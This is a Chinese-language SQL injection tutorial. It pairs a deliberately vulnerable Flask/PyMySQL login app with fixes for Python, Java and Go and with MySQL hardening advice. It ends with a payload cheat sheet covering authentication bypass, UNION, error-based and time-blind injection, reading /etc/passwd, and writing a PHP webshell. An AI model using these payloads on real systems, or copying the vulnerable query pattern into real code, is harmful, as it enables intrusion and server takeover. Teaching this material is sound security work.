3 漏洞应用 (Python + PyMySQL)

vuln_mysql.py 
from flask import Flask, request, render_template_string
import pymysql

app = Flask(__name__)

def get_db():
    return pymysql.connect(
        host='127.0.0.1', user='appuser',
        password='apppass', database='vuln_db',
        charset='utf8mb4'
    )

@app.route('/login', methods=['GET','POST'])
def login():
    result, sql = None, ""
    if request.method == 'POST':
        user = request.form['username']
        pwd = request.form['password']

        # ❌ VULNERABLE: f-string concatenation!
        sql = f"SELECT * FROM users WHERE username='{user}' AND password='{pwd}'"

        conn = get_db()
        try:
            with conn.cursor() as cur:
                cur.execute(sql)
                result = cur.fetchall()
        except Exception as e:
            result = f"MySQL Error: {str(e)}"
        finally:
            conn.close()

    return render_template_string('''
        <form method="post">
            User: <input name="username"><br>
            Pass: <input name="password"><br>
            <button type="submit">Login</button>
        </form>
        <p>SQL: {{ sql }}</p>
        <p>Result: {{ result }}</p>
    ''', sql=sql, result=result)

if __name__ == '__main__':
    app.run(debug=True, port=5000)

MySQL 防御：参数化查询是唯一银弹

为什么字符串拼接在 MySQL 中永远不安全？

❌ f-string / format
sql = f"WHERE user='{name}'"

数据和 SQL 指令混为一谈，MySQL 解析器无法区分。

✅ %s 占位符 + 参数元组
cur.execute("WHERE user=%s", (name,))

PyMySQL 会将参数安全转义后发送，无论输入什么都只是数据。注意：这里的 %s 不是 Python 格式化！

PyMySQL 修复

❌ BEFORE
cur.execute(
  f"SELECT * FROM users WHERE name='{name}'"
)
✅ AFTER
cur.execute(
  "SELECT * FROM users WHERE name=%s",
  (name,)
)
注意：PyMySQL 用 %s，不是 ?！且不要加引号包裹 %s

Java JDBC / MyBatis (MySQL)

❌ Statement
stmt.executeQuery(
  "SELECT * FROM users WHERE name='" + name + "'"
);
✅ PreparedStatement
PreparedStatement ps = conn.prepareStatement(
  "SELECT * FROM users WHERE name=?"
);
ps.setString(1, name);
ps.executeQuery();
MyBatis: 始终用 #{}"，禁用 ${}

Go (go-sql-driver/mysql)

❌ fmt.Sprintf
db.Query(fmt.Sprintf(
  "SELECT * FROM users WHERE name='%s'", name
))
✅ Placeholder
db.Query(
  "SELECT * FROM users WHERE name=?", name
)
Go MySQL 驱动用 ? 作为占位符
最小权限 GRANT

GRANT SELECT,INSERT ON vuln_db.* TO 'appuser'@'%';
禁止给应用账号 ALL PRIVILEGES 或 SUPER

禁用 LOAD_FILE / INTO OUTFILE

在 my.cnf 中设置 secure_file_priv=/nonexistent，防止注入后读写服务器文件。

关闭详细报错

生产环境不暴露 MySQL 错误信息，避免攻击者通过报错推断表结构（EXTRACTVALUE 报错注入依赖此信息）。

MySQL 注入速查表

类型MySQL Payload说明
认证绕过 ' OR '1'='1') # MySQL 用 # 或 -- (注意空格) 注释
UNION 注入 ' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database() # MySQL 独有 information_schema 元数据库
报错注入 ' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e)) # 利用 XPath 报错回显数据，MySQL 5.1+
时间盲注 ' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) # MySQL 的 SLEEP() + IF() 组合
文件读取 ' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 # 需 FILE 权限 + secure_file_priv 未限制
写 WebShell ' UNION SELECT '<?php eval($_POST[1]);?>',2,3,4,5 INTO OUTFILE '/var/www/html/shell.php' # 需 FILE 权限 + 可写目录 + secure_file_priv 未限制
